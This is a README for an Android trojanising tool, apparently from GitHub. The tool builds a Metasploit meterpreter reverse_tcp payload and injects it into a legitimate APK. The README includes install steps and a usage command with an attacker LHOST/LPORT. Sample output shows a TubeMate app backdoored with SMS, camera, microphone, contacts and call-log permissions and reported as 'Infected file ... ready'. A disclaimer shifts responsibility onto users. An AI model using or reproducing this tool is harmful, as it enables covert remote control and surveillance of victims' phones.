# EMBED v.2.0
This tool creates a payload with metasploit framework and injected into a legitimate APK.

	DISCLAIMER
If the law is violated with it's use, this would be the responsibility of the user who handled it..
Ivam3 is not responsible for the misuse that can be given to everything that this laboratory entails

# REQUIREMENTS.
- Metasploit
- Java
- Keytool
- Apktool
- Jarsigner
- Apksigner
- Aapt

# INSTALLATION.
- Install git:
```bash
apt install git -y
```

- Clone this repository:
```bash
git clone https://github.com/ivam3/embed.git
```

- Bring permissions to setup file:
```
chmod +x setup
```

- Run it with manual installation:
```bash
bash setup manual
```
It will install embed over clonned directory

- Or run it with apt instalation:
```bash
bash setup apt
```
It will instal embed with Advance Package Tool(apt) over your Termux enviroment (recommend/).

# USAGE

	root@user# ruby EMBED.rb PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546

	   ._____ __  __ ____  _____ ____
	   | ____|  \/  | __ )| ____|  _ \
	   |  _| |TERMUX|  _ \|  _| | | | |
	   | |___| |\/| | |_) | |___| |_| |
	   |_____|_|  |_|____/|_____|____/ v.2
	   #:::::::: By Ivam3 ::::::::::::#

	[*]─➤ Generating msfvenom payload..
	[*]─➤ Signing payload..
	[*]─➤ Decompiling orignal APK..
	[*]─➤ Ignoring the resource decompilation..
	[*]─➤ Decompiling payload APK..
	[*]─➤ Locating onCreate() hook..
	[*]─➤ Copying payload files..
	[*]─➤ Loading original/smali/devian/tubemate/home/Main.smali and injecting payload..
	[*]─➤ Poisoning the manifest with meterpreter permissions..
	[+]─➤ Adding android.permission.SEND_SMS
	[+]─➤ Adding android.permission.RECEIVE_SMS
	[+]─➤ Adding android.permission.RECORD_AUDIO
	[+]─➤ Adding android.permission.CALL_PHONE
	[+]─➤ Adding android.permission.READ_CONTACTS
	[+]─➤ Adding android.permission.WRITE_CONTACTS
	[+]─➤ Adding android.permission.RECORD_AUDIO
	[+]─➤ Adding android.permission.CAMERA
	[+]─➤ Adding android.permission.READ_SMS
	[+]─➤ Adding android.permission.RECEIVE_BOOT_COMPLETED
	[+]─➤ Adding android.permission.SET_WALLPAPER
	[+]─➤ Adding android.permission.READ_CALL_LOG
	[+]─➤ Adding android.permission.WRITE_CALL_LOG
	[*]─➤ Rebuilding /sdcard/Download/tubemate-2-4-21.apk with meterpreter injection as data/data/com_backdoored.apk..
	[*]─➤ Signing data/data/com_backdoored.apk ..
	[*]─➤ Aligning data/data/com_backdoored.apk ..
	[+]─➤ Infected file legitim.apk_final ready.


### License

GNU

##### Follow me on [Socials Network](https://wlo.link/@Ivam3)
